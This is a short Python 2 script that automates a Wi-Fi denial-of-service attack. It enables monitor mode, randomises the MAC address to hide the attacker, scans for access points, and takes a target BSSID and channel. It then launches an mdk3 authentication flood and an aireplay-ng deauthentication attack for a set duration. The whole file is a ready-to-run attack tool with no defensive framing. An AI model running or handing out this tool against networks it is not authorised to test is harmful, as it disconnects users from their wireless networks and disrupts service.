import os
import time
import subprocess
import signal
import math

os.system("airmon-ng stop mon0")
os.system("airmon-ng start wlan0")
os.system("ifconfig mon0 down")
os.system("macchanger -r mon0")
os.system("ifconfig mon0 up")
os.system("clear")
print ""
print "If you have found your target, press strg+c to interrupt airodump-ng" 
time.sleep(5)
os.system("airodump-ng mon0")
print ""
bs = raw_input("Enter BSSID: ")
print ""
print ""
ch = raw_input("Enter Channel: ") 

com = 'airodump-ng mon0 --bssid ' + bs + ' -c ' + ch
secom = 'mdk3 mon0 a -a ' + bs + ' -m'
thcom = 'aireplay-ng --deauth 10000 -a ' + bs
a = -1

os.system("clear")
print ""
dur = raw_input("Set the Attack-Length (in seconds): ") 

subprocess.call(['gnome-terminal', '-e', com])
subprocess.call(['gnome-terminal', '-e', secom])
subprocess.call(['gnome-terminal', '-e', thcom])

while dur > 0 : 
	dur = str(dur)
	os.system("clear")
	print ""
	print dur + ' Seconds left'
	time.sleep(1) 
	dur = int(dur)
	dur = dur + a

os.system("airmon-ng stop mon0") 
